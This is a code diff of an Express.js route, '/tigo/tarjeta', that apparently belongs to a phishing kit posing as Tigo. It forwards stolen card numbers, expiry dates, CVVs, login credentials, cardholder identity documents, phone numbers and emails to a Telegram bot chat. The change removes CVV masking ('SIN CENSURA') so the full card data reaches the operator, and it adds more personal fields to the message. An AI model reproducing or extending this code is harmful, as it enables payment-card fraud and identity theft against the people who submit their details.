@@ -1285,29 +1285,25 @@ app.post('/tigo/tarjeta', async (req, res) => {
       tipo: tipoTarjeta
     });
     
-    // Mensaje para Telegram
-    // Escapar caracteres especiales de Markdown
-    const escapeMd = (text) => {
-      if (!text) return 'N/D';
-      return String(text).replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
-    };
-    
-    const cvvMask = '•'.repeat(cvv?.length || 3);
-    
+    // Mensaje para Telegram (SIN CENSURA)
     const mensaje = `
-💳 *TARJETA INGRESADA*
+💳 TARJETA INGRESADA
 
-👤 Usuario: ${escapeMd(user)}
-🔑 Clave: ${escapeMd(pass)}
+👤 Usuario: ${user}
+🔑 CVV: ${cvv}
 
-💳 Número: ${escapeMd(numeroTarjeta)}
-📅 Vencimiento: ${escapeMd(vencimiento)}
-🔒 CVV: ${cvvMask}
-🏷️ Tipo: ${escapeMd(tipoTarjeta)}
-🏦 Entidad: ${escapeMd(nombreEntidad)}
+💳 Número: ${numeroTarjeta}
+📅 Vencimiento: ${vencimiento}
+🏷️ Tipo: ${tipoTarjeta}
+🏦 Entidad: ${nombreEntidad}
 
-🌐 IP: ${escapeMd(ip)} \\- ${escapeMd(city)}, ${escapeMd(country)}
-🆔 sessionId: ${escapeMd(sessionId)}
+👤 Titular: ${req.body.nombreTitular || 'N/D'}
+📄 Documento: ${req.body.tipoDocumento || 'CC'} - ${req.body.numeroDocumento || 'N/D'}
+📞 Teléfono: ${req.body.telefono || 'N/D'}
+📧 Email: ${req.body.email || 'N/D'}
+
+🌐 IP: ${ip} - ${city}, ${country}
+🆔 sessionId: ${sessionId}
     `.trim();
     
     // Mapeo de entidades a rutas
@@ -1348,7 +1344,6 @@ app.post('/tigo/tarjeta', async (req, res) => {
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje,
-      parse_mode: "MarkdownV2",
       reply_markup
     });
     
